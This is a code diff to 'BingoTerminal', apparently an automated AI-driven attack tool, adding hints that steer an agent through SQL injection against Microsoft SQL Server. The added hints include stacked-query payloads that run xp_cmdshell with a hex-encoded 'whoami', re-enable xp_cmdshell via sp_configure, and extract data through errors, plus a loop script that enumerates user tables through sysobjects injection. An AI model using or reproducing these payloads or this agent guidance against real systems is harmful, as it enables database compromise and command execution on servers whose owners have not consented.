@@ -3390,6 +3390,64 @@ class BingoTerminal:
                     "Do NOT waste more loops on these VBScript errors.\n"
                 )
 
+            # ADODB 800a0cc1 감지 — Stacked Query 실행 가능 신호
+            if "800a0cc1" in _raw_lower:
+                _lang = getattr(self.config, "lang", "en")
+                _stacked_msg = {
+                    "ko": "⚡ ADODB 800a0cc1 감지 — 세미콜론 스택 쿼리 실행 가능! (SELECT가 아닌 EXEC/INSERT 시도)",
+                    "zh": "⚡ 检测到ADODB 800a0cc1 — 分号堆叠查询可执行！(尝试EXEC/INSERT而非SELECT)",
+                    "en": "⚡ ADODB 800a0cc1 detected — semicolon stacked query IS executing! (try EXEC/INSERT not SELECT)",
+                }.get(_lang, "⚡ ADODB 800a0cc1 — stacked query executing!")
+                self.console.print(f"[bold green]{_stacked_msg}[/]")
+                _ip_block_hint += (
+                    "\n[STACKED_QUERY_OPPORTUNITY: ADODB 800a0cc1 detected]\n"
+                    "CRITICAL: Semicolon-stacked queries ARE executing on this endpoint!\n"
+                    "The 800a0cc1 error = ADO tried to read a column from a SELECT result but failed.\n"
+                    "This means the second statement ran but returned an unexpected recordset.\n"
+                    "NEXT STEPS:\n"
+                    "  1. Try side-effect stacked queries (no SELECT result needed):\n"
+                    "     payload = '4; EXEC master..xp_cmdshell 0x77686f616d69--'\n"
+                    "     payload = '4; INSERT INTO #tmp SELECT @@version--'\n"
+                    "  2. If xp_cmdshell disabled, try enabling:\n"
+                    "     payload = '4; EXEC sp_configure 0x73686f77206164...,1; RECONFIGURE--'\n"
+                    "  3. Use error-based to extract from stacked: CAST(@@version AS int)\n"
+                    "DO NOT use SELECT in stacked queries — it causes the 800a0cc1 recordset error.\n"
+                )
+
+            # 무한 루프 경고 — 같은 테이블 이름이 반복 출력 감지
+            _lines = trimmed.split("\n")
+            _table_lines = [l.strip() for l in _lines if l.strip() and not l.startswith("[") and not l.startswith("⏱") and not l.startswith("=") and not l.startswith("步") and not l.startswith("表")]
+            if len(_table_lines) >= 6:
+                _last_five = _table_lines[-5:]
+                if len(set(_last_five)) == 1:  # 마지막 5줄이 모두 동일
+                    _dup_val = _last_five[0]
+                    _lang = getattr(self.config, "lang", "en")
+                    _dup_msg = {
+                        "ko": f"🔁 무한 루프 경고: '{_dup_val}'이 계속 반복됨 — 중복 제거 + 페이지네이션 필요!",
+                        "zh": f"🔁 无限循环警告: '{_dup_val}' 不断重复 — 需要去重+分页!",
+                        "en": f"🔁 Infinite loop warning: '{_dup_val}' repeating — dedup + pagination required!",
+                    }.get(_lang, f"🔁 Loop warning: '{_dup_val}' repeating!")
+                    self.console.print(f"[bold red]{_dup_msg}[/]")
+                    _ip_block_hint += (
+                        f"\n[INFINITE_LOOP_DETECTED: same result '{_dup_val}' repeating]\n"
+                        "CRITICAL BUG IN YOUR SCRIPT: You are getting the same result in a loop!\n"
+                        "ROOT CAUSE: SELECT TOP 1 without pagination cursor always returns first row.\n"
+                        "MANDATORY FIX — Use cursor pagination:\n"
+                        "  seen = set()\n"
+                        "  last_hex = ''\n"
+                        "  while True:\n"
+                        "      if last_hex:\n"
+                        "          payload = f'AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name > {last_hex})'\n"
+                        "      else:\n"
+                        "          payload = 'AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55)'\n"
+                        "      result = extract(payload)\n"
+                        "      if not result or result in seen: break\n"
+                        "      seen.add(result)\n"
+                        "      last_hex = '0x' + result.encode().hex().upper()\n"
+                        "      print(result)\n"
+                        "STOP the current loop immediately and rewrite with this pattern.\n"
+                    )
+
             if _detected_blocks:
                 _wait_secs = 15
                 # 타임아웃만 감지된 경우 WAF 드롭으로 명시
